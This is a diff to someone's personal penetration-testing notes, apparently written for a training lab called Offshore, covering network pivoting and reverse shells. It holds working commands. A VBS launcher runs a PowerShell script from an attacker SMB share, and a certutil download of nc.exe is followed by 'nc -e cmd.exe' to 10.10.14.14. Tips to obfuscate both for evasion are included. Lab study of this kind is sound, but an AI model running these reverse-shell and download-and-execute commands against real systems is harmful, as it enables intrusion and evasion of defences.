@@ -1,3 +1,5 @@
+# These are just tricks I picked up in offshore, will get exploded into different dirs at some point.
+
 #### Pivoting
 
 ### method 1:
@@ -30,9 +32,6 @@ CTRL+Z
 use auxiliary/scanner/portscan/tcp   
 set RHOSTS 172.16.1.0/24  
 
-hhmmmmMMMM I must be doing something wrong I can curl some ip's I know are on the other side but cannot nmap or scan the range...   
-dd
-
 ### Method 4:  
 
 `ssh -D 1080 -i 10.10.110.123/root_ssh root@NIX01` *1080 is redsocks proxy default*  
@@ -53,6 +52,12 @@ paste in your shell, profit
 ## Start SMB for infil/exfil:  
 `$ sudo impacket-smbserver -smb2support GUEST /home/kymb0/Desktop/backup/offshore/toolz`
 
-Rewverse shell vbs
+## Reverse shell vbs (remember to run PS shellcode through https://github.com/danielbohannon/Invoke-obfuscation)
 `Set objShell = CreateObject("Wscript.Shell")
 objShell.Run("powershell.exe -noexit \\10.10.14.14\GUEST\l.ps1")`
+
+## Reverse shell bat (remember to run through https://github.com/danielbohannon/Invoke-DOSfuscation)
+cmd.exe /c
+certutil.exe -urlcache -split -f http://10.10.14.14/nc.exe 
+C:\ManageEngine_new\OpManager\logs\nc.exe
+C:\ManageEngine_new\OpManager\logs\nc.exe -nv 10.10.14.14 443 -e cmd.exe
